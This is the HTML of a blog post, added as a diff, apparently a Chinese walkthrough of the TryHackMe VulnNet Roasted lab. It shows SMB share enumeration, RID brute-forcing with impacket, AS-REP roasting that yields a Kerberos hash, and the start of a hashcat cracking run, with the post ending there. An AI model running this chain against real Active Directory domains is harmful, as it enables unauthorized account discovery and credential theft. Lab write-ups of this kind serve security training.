@@ -1,0 +1,688 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Fri Jun 24 13:46:58 2022 as: nmap -sC -sV -p- -Pn -T4 -oA thm.txt 10.10.45.136Nmap scan report">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-VulnNet Roasted">
+<meta property="og:url" content="http://example.com/2022/10/06/TryHackMe-VulnNet%20Roasted/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Fri Jun 24 13:46:58 2022 as: nmap -sC -sV -p- -Pn -T4 -oA thm.txt 10.10.45.136Nmap scan report">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:39.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>TryHackMe-VulnNet Roasted - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe-VulnNet Roasted"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          147 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TryHackMe-VulnNet Roasted</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Fri Jun 24 13:46:58 2022 as: nmap -sC -sV -p- -Pn -T4 -oA thm.txt 10.10.45.136</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.45.136<br>Host is up (0.34s latency).<br>Not shown: 65516 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-24 05:53:57Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49668/tcp open  msrpc         Microsoft Windows RPC<br>49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49670/tcp open  msrpc         Microsoft Windows RPC<br>49677/tcp open  msrpc         Microsoft Windows RPC<br>49692/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-06-24T05:54:55<br>|_  start_date: N/A<br>|_clock-skew: 22s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Fri Jun 24 13:55:21 2022 -- 1 IP address (1 host up) scanned in 503.94 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>如果起初在基于目标什么信息都没有的情况下，可以尝试去匿名访问的形式枚举，例如SMB：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbmap</span> -H 10.10.45.136 -u <span class="hljs-built_in">whoami</span><br>[+] Guest session   	IP: 10.10.45.136:445	Name: 10.10.45.136                                      <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	NO ACCESS	Logon server share <br>	SYSVOL                                            	NO ACCESS	Logon server share <br>	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing<br>	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharin<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbclient</span> //10.10.45.136/VulnNet-Business-Anonymous<br>Enter WORKGROUP\mosaic<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sat Mar 13 10:46:40 2021</span><br><span class="hljs-string">  ..                                  D        0  Sat Mar 13 10:46:40 2021</span><br><span class="hljs-string">  Business-Manager.txt                A      758  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string">  Business-Sections.txt               A      654  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string">  Business-Tracking.txt               A      471  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">		8771839 blocks of size 4096. 4519050 blocks available</span><br><span class="hljs-string">smb: \&gt; mget *</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbclient</span> //10.10.45.136/VulnNet-Enterprise-Anonymous<br>Enter WORKGROUP\mosaic<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sat Mar 13 10:46:40 2021</span><br><span class="hljs-string">  ..                                  D        0  Sat Mar 13 10:46:40 2021</span><br><span class="hljs-string">  Enterprise-Operations.txt           A      467  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string">  Enterprise-Safety.txt               A      503  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string">  Enterprise-Sync.txt                 A      496  Fri Mar 12 09:24:34 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">		8771839 blocks of size 4096. 4526778 blocks available</span><br><span class="hljs-string">smb: \&gt; mget *</span><br></code></pre></td></tr></table></figure>
+
+<p>smbcclient可以匿名访问，那rpcclient应该也可以，只不过被禁止执行功能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rpcclient</span> -U <span class="hljs-string">&quot;&quot;</span> 10.10.45.136<br>Enter WORKGROUP\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">rpcclient $&gt; enumdomusers </span><br><span class="hljs-string">result was NT_STATUS_ACCESS_DENIED</span><br><span class="hljs-string">rpcclient $&gt; enmudomgroups</span><br><span class="hljs-string">command not found: enmudomgroups</span><br><span class="hljs-string">result was NT_STATUS_ACCESS_DENIED</span><br></code></pre></td></tr></table></figure>
+
+<p>那就应该看看共享中的文件中有些什么：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$cat</span> Business-*<br>VULNNET BUSINESS<br>~~~~~~~~~~~~~~~~~~~<br><br>Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. <br>We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. <br>Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.<br>We’re here to <span class="hljs-built_in">help</span>, regardless of <span class="hljs-built_in">which</span> you plan you’re on or <span class="hljs-keyword">if</span> you’re just taking us <span class="hljs-keyword">for</span> a <span class="hljs-built_in">test</span> drive.<br>Our company looks forward to all of the business proposals, we will <span class="hljs-keyword">do</span> our best to evaluate all of your offers properly. <br>To contact our core business manager call this number: 1337 0000 7331<br><br>~VulnNet Entertainment<br>~TryHackMe<br>VULNNET BUSINESS<br>~~~~~~~~~~~~~~~~~~~<br><br>Jack Goldenhand is the person you should reach to <span class="hljs-keyword">for</span> any business unrelated proposals.<br>Managing proposals is a breeze with VulnNet. We save all your <span class="hljs-keyword">case</span> studies, fees, images and team bios all <span class="hljs-keyword">in</span> one central library.<br>Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?<br>No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).<br>Your client gets a branded, interactive proposal they can sign off electronically. No need <span class="hljs-keyword">for</span> extra software or logins.<br>Oh, and we tell you as soon as your client opens it.<br><br>~VulnNet Entertainment<br>~TryHackMe<br>VULNNET TRACKING<br>~~~~~~~~~~~~~~~~~~<br><br>Keep a pulse on your sales pipeline of your agency. We <span class="hljs-built_in">let</span> you know your close rate,<br><span class="hljs-built_in">which</span> sections of your proposals get viewed and <span class="hljs-keyword">for</span> how long,<br>and all kinds of insight into what goes into your most successful proposals so you can sell smarter.<br>We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. <br>You won<span class="hljs-string">&#x27;t miss anything ever again. </span><br><span class="hljs-string"></span><br><span class="hljs-string">~VulnNet Entertainment</span><br><span class="hljs-string">~TryHackMe</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$cat</span> Enterprise-*<br>VULNNET OPERATIONS<br>~~~~~~~~~~~~~~~~~~~~<br><br>We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. <br>Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.<br>Don<span class="hljs-string">&#x27;t wait for an opportunity to knock - build the door. Contact us right now.</span><br><span class="hljs-string">VulnNet Entertainment is fully commited to growth, security and improvement.</span><br><span class="hljs-string">Make a right decision!</span><br><span class="hljs-string"></span><br><span class="hljs-string">~VulnNet Entertainment</span><br><span class="hljs-string">~TryHackMe</span><br><span class="hljs-string">VULNNET SAFETY</span><br><span class="hljs-string">~~~~~~~~~~~~~~~~</span><br><span class="hljs-string"></span><br><span class="hljs-string">Tony Skid is a core security manager and takes care of internal infrastructure.</span><br><span class="hljs-string">We keep your data safe and private. When it comes to protecting your private information...</span><br><span class="hljs-string">we’ve got it locked down tighter than Alcatraz. </span><br><span class="hljs-string">We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. </span><br><span class="hljs-string">And we never, EVER disclose any data to third-parties without your permission. </span><br><span class="hljs-string">Rest easy, nothing’s getting out of here alive.</span><br><span class="hljs-string"></span><br><span class="hljs-string">~VulnNet Entertainment</span><br><span class="hljs-string">~TryHackMe</span><br><span class="hljs-string">VULNNET SYNC</span><br><span class="hljs-string">~~~~~~~~~~~~~~</span><br><span class="hljs-string"></span><br><span class="hljs-string">Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.</span><br><span class="hljs-string">Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,</span><br><span class="hljs-string">auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.</span><br><span class="hljs-string">Say no more to desync problems.</span><br><span class="hljs-string">To contact our sync manager call this number: 7331 0000 1337</span><br><span class="hljs-string"></span><br><span class="hljs-string">~VulnNet Entertainment</span><br><span class="hljs-string">~TryHackMe</span><br></code></pre></td></tr></table></figure>
+
+<p>四个参考用户名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Alexa Whitehat<br>Jack Goldenhand<br>Tony Skid<br>Johnny Leet<br></code></pre></td></tr></table></figure>
+
+<p>介于目标IPC$被允许匿名可读。可使用impacket工具包中的lookupsid.py暴力枚举RID以获取域内用户信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$lookupsid</span>.py vulnnet-rst/whoami@10.10.45.136 -no-pass &gt;users.txt<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[*] Brute forcing SIDs at 10.10.45.136<br>[*] StringBinding ncacn_np:10.10.45.136[\pipe\lsarpc]<br>[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213<br>498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)<br>500: VULNNET-RST\Administrator (SidTypeUser)<br>501: VULNNET-RST\Guest (SidTypeUser)<br>502: VULNNET-RST\krbtgt (SidTypeUser)<br>512: VULNNET-RST\Domain Admins (SidTypeGroup)<br>513: VULNNET-RST\Domain Users (SidTypeGroup)<br>514: VULNNET-RST\Domain Guests (SidTypeGroup)<br>515: VULNNET-RST\Domain Computers (SidTypeGroup)<br>516: VULNNET-RST\Domain Controllers (SidTypeGroup)<br>517: VULNNET-RST\Cert Publishers (SidTypeAlias)<br>518: VULNNET-RST\Schema Admins (SidTypeGroup)<br>519: VULNNET-RST\Enterprise Admins (SidTypeGroup)<br>520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)<br>521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)<br>522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)<br>525: VULNNET-RST\Protected Users (SidTypeGroup)<br>526: VULNNET-RST\Key Admins (SidTypeGroup)<br>527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)<br>553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)<br>571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)<br>572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)<br>1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)<br>1101: VULNNET-RST\DnsAdmins (SidTypeAlias)<br>1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)<br>1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)<br>1105: VULNNET-RST\a-whitehat (SidTypeUser)<br>1109: VULNNET-RST\t-skid (SidTypeUser)<br>1110: VULNNET-RST\j-goldenhand (SidTypeUser)<br>1111: VULNNET-RST\j-leet (SidTypeUser)<br></code></pre></td></tr></table></figure>
+
+<p>筛选处理有用的文本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$grep</span> SidTypeUser users.txt | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="hljs-string">&quot;\\&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; newusers.txt<br><span class="hljs-variable">$cat</span> newusers.txt <br>Administrator<br>Guest<br>krbtgt<br>WIN-2BO8M1OE1M1$<br>enterprise-core-vn<br>a-whitehat<br>t-skid<br>j-goldenhand<br>j-leet<br></code></pre></td></tr></table></figure>
+
+<h3 id="ASREProasting"><a href="#ASREProasting" class="headerlink" title="ASREProasting"></a>ASREProasting</h3><p>然后看有没有禁用预认证用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$GetNPUsers</span>.py <span class="hljs-string">&#x27;VULNNET-RST/&#x27;</span> -usersfile newusers.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.45.136<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[-] User Administrator doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User Guest doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] User WIN-2BO8M1OE1M1$ doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User enterprise-core-vn doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User a-whitehat doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User j-goldenhand doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User j-leet doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string"></span><br><span class="hljs-string">$cat ASREProastables.txt </span><br><span class="hljs-string">$krb5asrep$23$t-skid@VULNNET-RST:790abfdf61710280a020478ac648d95b$5b551dc44e7d4b1f93bc8cc4c2d9ee12f27338a288bc42ba2a5331e068398375d5a69d717d3a098a2793ce03911181e9a7fae0fee6d633d5706e2bad750eb617410af1e660e6272f1c5e0bbadf61c9fc03a6e5c35bb42bafb273d06959b9ca10e3d297da5336fb598eacb1e1967ec6f85318e00c89b72aca588ba03ccc908c986e31cb47e6e1c2014a6819a7a3664076743c2b7ec145582f632c02414b2c5d2f64dd7d91766ce57e295b02602194bf9f70ba5a4287222b0bc374b5751d25cffc4fe51dc6ef6fe209261534c91bc377668c7439b88851c09bc1ea6b5b3a2718cacccafa412b4ac562b3071e16051d345d</span><br><span class="hljs-string"></span><br><span class="hljs-string">$hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt</span><br><span class="hljs-string"></span><br><span 